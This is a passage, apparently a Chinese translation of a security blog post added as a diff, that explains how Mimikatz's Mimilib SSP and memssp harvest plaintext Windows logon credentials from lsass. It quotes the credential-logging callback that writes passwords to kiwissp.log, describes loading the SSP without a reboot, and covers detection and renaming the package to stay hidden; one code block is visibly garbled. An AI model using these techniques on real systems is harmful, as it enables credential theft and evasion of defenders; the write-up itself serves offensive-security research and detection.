@@ -1,0 +1,64 @@
+## 前言
+在上篇文章([探索Mimikatz-第1部分-Wdigest](https://xz.aliyun.com/t/8268))中，我们初步探索了Mimikatz。目的很单纯，就是为了搞清楚mimikatz其内部原理，以便开发定制专用的payload。这篇文章中，我们详探一种绕过Microsoft安全控制的一种好方法，该安全控制的主要目的是防止凭据（例如Credential
+Guard）的转储以及提取。而这对应的功能，就是Mimikatz对SSP的支持。
+SSP（Security Support
+Provider,安全支持提供程序）是一个DLL，在某些身份验证和授权事件过程中，它允许开发人员公开要调用的许多回调函数。正如我们在上一篇文章中所看到的，`Wdigest`提供了使用此接口缓存的凭据。
+Mimikatz提供了几种不同的技术来利用SSP。首先是`Mimilib`，它是一个具有多种功能的DLL，包括实现SSP接口。其次是`smemssp`，与前者干的是同一件事，但是是用过patch内存来达到目的，而不是加载DLL。
+让我们从传统方式加载SSP开始，即Mimilib。
+> 致谢：如前一篇文章所述，这篇文章大量使用了Mimikatz的源代码，其开发人员投入了大量的时间。感谢Mimikatz，Benjamin
+> Delpy和Vincent Le Toux等父老乡亲。
+## Mimilib
+Mimilib有点万金油，它既支持`ServerLevelPluginDll`通过RPC进行横向移动，也支持DHCP服务器调用，甚至还充当WinDBG的扩展。回到本文，我们将研究该库如何充当SSP，从而为攻击者提供一种在受害者输入凭据时能够提取这些信息的方法。
+系统使用明文凭据调用SSP,这意味着Mimilib可以窃取明文凭证。Mimilib的SSP函数入口点位于kssp.c中，具体来说是`kssp_SpLsaModeInitialize`。
+该函数通过`mimilib.def`定义文件从DLL作为`SpLsaModeInitialize`导出，被`lsass`用来初始化一些包含多个回调函数的结构。
+对于Mimilib，注册的回调函数为：
+    SpInitialize --用于初始化SSP并提供函数指针列表。
+    SpShutDown --要求卸载SSP，从而有机会释放资源。
+    SpGetInfoFn --提供有关SSP的信息，包括版本，名称和描述。
+    SpAcceptCredentials --接收由LSA传递并由SSP缓存的纯文本凭据。
+如果您阅读了上一篇文章就会知道，WDigest使用`SpAcceptCredentials`来缓存凭据，多年来大家一直通过这个切入点来利用，屡试不爽。
+并且，`SpAcceptCredentials`使用明文凭据的副本进行调用。那么，Mimilib剩下的工作就是简简单单地存储凭据就ok了，而这正是`kssp_SpAcceptCredentials`函数所干的活：
+    NTSTATUS NTAPI kssp_SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
+    {
+        FILE *kssp_logfile;
+    #pragma warning(push)
+    #pragma warning(disable:4996)
+        if(kssp_logfile = _wfopen(L"kiwissp.log", L"a"))
+    #pragma warning(pop)
+        {   
+            klog(kssp_logfile, L"[%08x:%08x] [%08x] %wZ\\%wZ (%wZ)\t", PrimaryCredentials->LogonId.HighPart, PrimaryCredentials->LogonId.LowPart, LogonType, &PrimaryCredentials->DomainName, &PrimaryCredentials->DownlevelName, AccountName);
+            klog_password(kssp_logfile, &PrimaryCredentials->Password);
+            klog(kssp_logfile, L"\n");
+            fclose(kssp_logfile);
+        }
+        return STATUS_SUCCESS;
+    }
+现在，我不相信mimikatz.exe直接提供了加载Mimilib的功能，但是从Microsoft的文档中我们知道，系统是通过添加注册表项和重新启动来添加SSP
+。
+经过一番搜索，我发现了这条推文：  
+上图直接提到了对 `AddSecurityPackage`这个API的引用，该API 实际上在@mattifestation的`Install-SSP.ps1`脚本中使用，以加载SSP，这意味着实际上可以通过添加Mimilib而无需重新启动系统。并且在SSP加载后，每次身份验证都会将凭据写入到`kiwissp.log`文件中：
+现在在目标环境中使用SSP有一个缺点，那就是必须在lsass中注册SSP。当需要追踪攻击者的恶意活动的时候，这为防御者提供了很多便利，不管是创建用来引用SSP的注册表项，还是只是lsass进程中的一个异常DLL，都能发现攻击者的蛛丝马迹。另外，SSP还公开了名称和注释，可以使用`EnumerateSecurityPackages`函数枚举它们：
+    #define SECURITY_WIN32
+    #include 
+    #include 
+    #include 
+    int main(int argc, char **argv) {
+        ULONG packageCount = 0;
+        PSecPkgInfoA packages;
+    if (EnumerateSecurityPackagesA(&packageCount, &packages) == SEC_E_OK) {
+            for (int i = 0; i fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
+        PackageInfo->wVersion   = 1;
+        PackageInfo->wRPCID     = SECPKG_ID_NONE;
+        PackageInfo->cbMaxToken = 0;
+        PackageInfo->Name       = L"KiwiSSP";
+        PackageInfo->Comment    = L"Kiwi Security Support Provider";
+        return STATUS_SUCCESS;
+    }
+更改Name和Comment字段之后，如下图所示：
+显然这仍然不是很好（即使使用如此优秀的名称和注释字段也不行）。因为， **Mimilib不需要剥离和重新编译** ，它包含了许多功能，而不仅仅是充当SSP。
+那么到底该如何解决呢？幸运的是Mimikatz还支持`misc::memssp`，它提供了一个不错的选择。
+## MemSSP
+MemSSP的原理大致是处理lsass内存，通过标识和patch函数以重定向执行来进行。
+看看入口函数`kuhl_m_misc_memssp`。如下所示，可以看到lsass进程已打开，并且开始搜索`msv1_0.dll`，这是一个支持交互式身份验证的验证程序包：
+    NTSTATUS kuhl_m_misc_memssp(int argc, wchar_t * argv[])
+    {
